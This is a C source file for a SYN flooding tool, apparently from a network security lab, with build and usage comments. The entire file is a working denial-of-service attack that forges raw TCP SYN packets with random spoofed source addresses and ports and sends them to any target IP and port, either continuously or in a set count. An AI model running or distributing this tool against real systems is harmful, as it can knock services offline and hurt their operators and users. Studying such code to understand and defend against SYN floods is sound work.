/* tcp_syn_flooding
* 
* complition:
  gcc checksum.c tcp_syn_flooding.c -o tcp_syn_flooding
* Usage:
*   sudo ./tcp_syn_flooding target_ip target_port [num_packets]
If num_packets is specified and no less than 0, num_packets of spoofed SYNC packets are sent
otherwise, spoofed SYNC packets will be sent out continuously, CTRL+C to stop.
e.g
  sudo ./tcp_syn_flooding 10.0.2.69 80
  or
  sudo ./tcp_syn_flooding 10.0.2.69 80 10000
equivalent to
  sudo netwox 76 -i target_ip -p target_port  -s raw
Refs:
1. [SYN cookies](https://en.wikipedia.org/wiki/SYN_cookies)  
*/
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include "myheader.h"

#define DEST_IP "10.0.2.69"
#define DEST_PORT 80 // Attack the web server
#define PACKET_LEN 1500

/*************************************************************
  Given an IP packet, send it out using a raw socket.
**************************************************************/
void send_raw_ip_packet(struct ipheader *ip)
{
  struct sockaddr_in dest_info;
  int enable = 1;

  // Step 1: Create a raw network socket.
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  // Step 2: Set socket option.
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
             &enable, sizeof(enable));

  // Step 3: Provide needed information about destination.
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  // Step 4: Send the packet out.
  sendto(sock, ip, ntohs(ip->iph_len), 0,
         (struct sockaddr *)&dest_info, sizeof(dest_info));
  close(sock);
}

/******************************************************************
  Spoof a TCP SYN packet.
*******************************************************************/
int main(int argc, char *argv[])
{
  long long num_packets = -1;

  if (argc < 3)
  {
    printf("Usage: sudo %s target_ip target_port [num_packets]\n", argv[0]);
    return 1;
  }

  if (argc == 4)
  {
    num_packets = atoll(argv[3]);
  }

  char buffer[PACKET_LEN];
  struct ipheader *ip = (struct ipheader *)buffer;
  struct tcpheader *tcp = (struct tcpheader *)(buffer +
                                               sizeof(struct ipheader));

  srand(time(0)); // Initialize the seed for random # generation.
  while ((num_packets == -1) || (num_packets > 0))
  {
    num_packets == (num_packets > 0) ? --num_packets : num_packets;

    memset(buffer, 0, PACKET_LEN);
    /*********************************************************
        Step 1: Fill in the TCP header.
     ********************************************************/
    tcp->tcp_sport = rand(); // Use random source port
    //  tcp->tcp_dport = htons(DEST_PORT);
    tcp->tcp_dport = htons(atoi(argv[2])); // target_port
    tcp->tcp_seq = rand();                 // Use random sequence #
    tcp->tcp_offx2 = 0x50;
    tcp->tcp_flags = TH_SYN; // Enable the SYN bit
    tcp->tcp_win = htons(20000);
    tcp->tcp_sum = 0;

    /*********************************************************
        Step 2: Fill in the IP header.
     ********************************************************/
    ip->iph_ver = 4;                  // Version (IPV4)
    ip->iph_ihl = 5;                  // Header length
    ip->iph_ttl = 50;                 // Time to live
    ip->iph_sourceip.s_addr = rand(); // Use a random IP address
    //  ip->iph_destip.s_addr = inet_addr(DEST_IP);
    ip->iph_destip.s_addr = inet_addr(argv[1]); // target_ip
    ip->iph_protocol = IPPROTO_TCP;             // The value is 6.
    ip->iph_len = htons(sizeof(struct ipheader) +
                        sizeof(struct tcpheader));

    // Calculate tcp checksum
    tcp->tcp_sum = calculate_tcp_checksum(ip);

    /*********************************************************
       Step 3: Finally, send the spoofed packet
     ********************************************************/
    send_raw_ip_packet(ip);
  }

  return 0;
}
